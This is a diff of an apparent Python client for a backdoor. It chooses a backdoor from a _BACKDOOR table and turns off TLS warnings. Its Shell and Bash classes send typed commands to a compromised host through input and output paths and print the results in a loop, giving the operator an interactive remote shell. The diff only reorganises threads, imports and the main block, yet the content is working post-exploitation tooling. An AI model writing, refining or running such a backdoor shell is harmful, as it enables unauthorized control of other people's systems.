@@ -5,9 +5,6 @@ from base64 import b64encode
 import requests
 from requests.packages.urllib3 import disable_warnings
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
-from threading import Thread
-from time import sleep
-from sys import stderr
 
 disable_warnings(InsecureRequestWarning)
 
@@ -158,27 +155,14 @@ class Bash(Shell):
         return self.system(command)
 
     def clear(self):
-        return
-
-def setup_task(shell):
-    try:
-        shell.setup()
-    except Exception as e:
-        print(f'SETUP_ERROR: {e}', file=stderr)
-
-def read_task(shell, interval):
-    while True:
-        try:
-            contents = shell.read()
-            print(contents, end='')
-            shell.clear()
-        except Exception as e:
-            print(f'READ_ERROR: {e}', file=stderr)
-        sleep(interval)
+        pass
 
 if __name__ == '__main__':
     from argparse import ArgumentParser
     from os import environ
+    from sys import stderr
+    from threading import Thread
+    from time import sleep
 
     parser = ArgumentParser()
     parser.add_argument('backdoor', choices=list(_BACKDOOR))
@@ -208,31 +192,48 @@ if __name__ == '__main__':
                 except Exception as e:
                     print(f'SYSTEM_ERROR: {e}', file=stderr)
         except KeyboardInterrupt:
-            exit(0)
-
-
-    if args.shell:
-        shell = Shell(backdoor, args.inpath, args.outpath)
+            pass
     else:
-        shell = Bash(backdoor, args.inpath, args.outpath)
+        if args.shell:
+            shell = Shell(backdoor, args.inpath, args.outpath)
+        else:
+            shell = Bash(backdoor, args.inpath, args.outpath)
 
-    if not args.skip:
-        thread1 = Thread(target=setup_task, args=[shell])
-        thread1.setDaemon(True)
-        thread1.start()
-        sleep(2)
+        if not args.skip:
+            def setup_task(shell):
+                try:
+                    shell.setup()
+                except Exception as e:
+                    print(f'SETUP_ERROR: {e}', file=stderr)
 
-    thread2 = Thread(target=read_task, args=[shell, args.interval])
-    thread2.setDaemon(True)
-    thread2.start()
+            thread1 = Thread(target=setup_task, args=[shell])
+            thread1.setDaemon(True)
+            thread1.start()
+            sleep(2)
 
-    try:
-        while True:
-            command = input()
-            try:
-                shell.write(command)
-            except Exception as e:
-                print(f'WRITE_ERROR: {e}', file=stderr)
-    except KeyboardInterrupt:
-        exit(0)
+        def read_task(shell, interval):
+            while True:
+                try:
+                    contents = shell.read()
+                    print(contents, end='')
+                    if contents:
+                        shell.clear()
+                except Exception as e:
+                    print(f'READ_ERROR: {e}', file=stderr)
+                sleep(interval)
+
+        thread2 = Thread(target=read_task, args=[shell, args.interval])
+        thread2.setDaemon(True)
+        thread2.start()
+
+        try:
+            while True:
+                command = input()
+                try:
+                    shell.write(command)
+                except Exception as e:
+                    print(f'WRITE_ERROR: {e}', file=stderr)
+        except KeyboardInterrupt:
+            pass
+    exit(0)
 
